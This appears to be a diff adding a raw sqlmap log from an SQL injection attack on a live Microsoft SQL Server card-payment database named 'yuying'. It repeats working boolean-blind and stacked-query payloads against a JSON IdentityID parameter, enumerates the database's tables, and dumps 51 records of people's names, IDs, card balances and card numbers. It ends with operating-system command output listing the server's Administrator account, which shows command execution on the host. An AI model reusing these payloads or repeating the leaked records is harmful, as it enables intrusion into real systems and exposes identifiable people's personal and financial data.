+| LossCard                |
+| Main                    |
+| Main_Temp               |
+| Main_bak                |
+| ManType                 |
+| Modal1                  |
+| Persons                 |
+| SendData                |
+| SubsidizeRd             |
+| Tbl_Details             |
+| TmpAllCons13            |
+| TmpAllCons14            |
+| TmpAllCons15            |
+| TmpAllCons16            |
+| TmpAllCons17            |
+| TmpAllCons18            |
+| TmpSale                 |
+| UserLogm                |
+| V_Details               |
+| V_PersonInfo            |
+| accperson               |
+| archive                 |
+| autobt                  |
+| constimset              |
+| dayconsume              |
+| dealmoney               |
+| dtproperties            |
+| mealconsume             |
+| oldcardcode             |
+| serverinfo              |
+| sf98Para                |
+| t00                     |
+| tbl_Archive_Log         |
+| tbl_Archive_LogSuc      |
+| tbl_Receive_Log         |
+| tbl_Receive_Log20171021 |
+| temp_ConsumeRecord      |
+| tmpconsume              |
+| userdept                |
++-------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+[53 tables]
++-------------------------+
+| AccBalan                |
+| AccDeposit              |
+| AddCard                 |
+| Bu_Acco_info            |
+| CardDeposit             |
+| ClientSet               |
+| DayPlan                 |
+| DealCard                |
+| DeptSet                 |
+| FixPrice2               |
+| GetData                 |
+| GroupSet                |
+| Level1                  |
+| LevelRight              |
+| LossCard                |
+| Main                    |
+| Main_Temp               |
+| Main_bak                |
+| ManType                 |
+| Modal1                  |
+| Persons                 |
+| SendData                |
+| SubsidizeRd             |
+| Tbl_Details             |
+| TmpAllCons13            |
+| TmpAllCons14            |
+| TmpAllCons15            |
+| TmpAllCons16            |
+| TmpAllCons17            |
+| TmpAllCons18            |
+| TmpSale                 |
+| UserLogm                |
+| V_Details               |
+| V_PersonInfo            |
+| accperson               |
+| archive                 |
+| autobt                  |
+| constimset              |
+| dayconsume              |
+| dealmoney               |
+| dtproperties            |
+| mealconsume             |
+| oldcardcode             |
+| serverinfo              |
+| sf98Para                |
+| t00                     |
+| tbl_Archive_Log         |
+| tbl_Archive_LogSuc      |
+| tbl_Receive_Log         |
+| tbl_Receive_Log20171021 |
+| temp_ConsumeRecord      |
+| tmpconsume              |
+| userdept                |
++-------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: DealCard
+[14 columns]
++-----------+----------+
+| Column    | Type     |
++-----------+----------+
+| balanmark | nvarchar |
+| cardtype  | nvarchar |
+| DealDate  | nvarchar |
+| DealTime  | nvarchar |
+| GBF       | money    |
+| ID        | nvarchar |
+| Money0    | money    |
+| Name      | nvarchar |
+| NewCode   | nvarchar |
+| OldCode   | nvarchar |
+| Persons   | nvarchar |
+| sign      | nvarchar |
+| sn        | char     |
+| userdept  | nvarchar |
++-----------+----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+Database: yuying
+Table: DealCard
+[51 entries]
++----------------+------+---------+------------+------------+
+| ID             | Name | Money0  | Newcode    | Oldcode    |
++----------------+------+---------+------------+------------+
+| 11131404       | 张子睿  | 233.40  | 0486050146 | 3553063500 |
+| 11131443       | 张怡然  | 111.20  | 0474113650 | 0524857235 |
+| 20170805023    | 王运达  | 45.60   | 0530787155 | 0481002178 |
+| 8170010905     | 仉佳璐  | 108.90  | 0486196594 | 0524110227 |
+| 2016081821     | 赵天池  | 141.70  | 0484375026 | 0535081843 |
+| 11131438       | 严景   | 67.77   | 0482250482 | 0832886054 |
+| x2106102       | 董玉然  | 0.00    | 0480015298 | 0389770992 |
+| 20140415       | 蒋煜阳  | 388.80  | 0475257250 | 0472110194 |
+| 11114713       | 管靖棋  | 275.40  | 0472976866 | 3551482172 |
+| 29170010116    | 吴梦娇  | 51.90   | 0483906034 | 1675433243 |
+| 20160831001    | 邱宇航  | 99.20   | 0524373411 | 0477462722 |
+| 11298058       | 王一鸣  | 206.50  | 0478360178 | 3104923210 |
+| 11131594       | 张海默  | 135.50  | 0531382611 | 1606064523 |
+| ywj150527062   | 张天蕊  | 41.80   | 0486172290 | 4273529804 |
+| 11113199       | 余欣婷  | 10.20   | 0483871122 | 2776421153 |
+| 11131342       | 焦响   | 1.30    | 0480204194 | 3104499850 |
+| 20160710019    | 潘瑞林  | 149.00  | 0479868786 | 0474339026 |
+| 20140436       | 邹正禹  | 104.00  | 0475508338 | 0477723042 |
+| ywj150527063   | 赵一鸣  | 42.80   | 0521645971 | 0087732082 |
+| JS234          | 袁杰梅  | 3607.62 | 3725847381 | 1456836990 |
+| JS2015022706   | 焦雪芬  | 3794.65 | 3725214357 | 0505037131 |
+| 11163594       | 毛艺洁  | 189.00  | 0531472787 | 0475703490 |
+| x2110110       | 隋文杰  | 0.00    | 0485652098 | 0391178976 |
+| 13124409       | 孔卉馨  | 0.00    | 0484180962 | 0128897920 |
+| x2106105       | 郭羽亮  | 0.00    | 0530066563 | 0388417760 |
+| 2016081807     | 吕霁洲  | 25.20   | 0484117378 | 0833287590 |
+| 13124370       | 葛家瑞  | 0.00    | 0477875106 | 0127359616 |
+| x2101105       | 韩家兴  | 0.00    | 0535919011 | 0393846512 |
+| x2101104       | 桂小钧  | 0.00    | 0486178946 | 0401784288 |
+| x2101212       | 王梓涵  | 0.00    | 0480261490 | 0386541040 |
+| x2101103       | 管勃皓  | 0.00    | 0530058643 | 0396847344 |
+| 13124592       | 殷乔乔  | 0.00    | 0528570515 | 0087416162 |
+| 11131366       | 张一驰  | 112.20  | 0478429874 | 0123286144 |
+| 11113903       | 李卓   | 53.60   | 0480068754 | 1120548571 |
+| ywj150527073   | 刘思雨  | 238.60  | 0484062626 | 0473271650 |
+| 11131376       | 郝王恩泽 | 48.80   | 0536023907 | 0475214514 |
+| 11131376       | 郝王恩泽 | 348.80  | 0533139555 | 0536023907 |
+| 11131376       | 郝王恩泽 | 340.80  | 0473171682 | 0533139555 |
+| 11112333       | 彭悦   | 1.00    | 0500413954 | 1252427770 |
+| 20160710038    | 朱恒恺  | 187.00  | 0473348562 | 1451187868 |
+| 11131457       | 郎硕   | 115.80  | 0478413474 | 0478710114 |
+| 11131443       | 张怡然  | 203.80  | 0524857235 | 4273120332 |
+| 2014041401     | 黄红铸  | 4042.92 | 3726742997 | 1832342604 |
+| 8170010904     | 张博涵  | 14.60   | 0472346562 | 0528936051 |
+| 20140506       | 贾卓洋  | 3.74    | 0486175682 | 3560000492 |
+| 2016081922     | 姜青菡  | 111.40  | 0472917378 | 0830999734 |
+| gy150828125    | 李知行  | 85.00   | 0484549730 | 0386081008 |
+| 8170010825     | 尹鹤璇  | 45.30   | 0480690882 | 0527300499 |
+| 20140134       | 种佳音  | 142.40  | 0474316146 | 0498655234 |
+| ywj20150906002 | 刘笑妤  | 88.58   | 0536336755 | 0475338146 |
+| 20141026       | 杨乐天  | 202.00  | 0482435042 |
++----------------+------+---------+------------+------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+command standard output:
+---
+发生系统错误 1376。
+ 
+指定的本地组不存在。
+
+---
+command standard output:
+---
+找不到用户名。
+ 
+请键入 NET HELPMSG 2221 以获得更多的帮助。
+
+---
+command standard output:
+---
+\\ 的用户帐户
+ 
+-------------------------------------------------------------------------------
+Administrator
+命令运行完毕，但发生一个或多个错误。
+
+---
+command standard output:
+---
+用户名
+ administrator         console
+---
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+command standard output:
+---
+Node - 2RP8SWHMKKDKJKH
+ERROR:
+Description = Invalid query
+
+
+---
+command standard output:
+---
+找不到用户名。
+ 
+请键入 NET HELPMSG 2221 以获得更多的帮助。
+
+---
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
+command standard output [1]:
+[*]  
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON IdentityID ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"IdentityID":"2016081850' AND 8269=8269 AND 'ZyyY'='ZyyY"}
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (comment)
+    Payload: {"IdentityID":"2016081850';WAITFOR DELAY '0:0:5'--"}
+---
+back-end DBMS: Microsoft SQL Server 2008
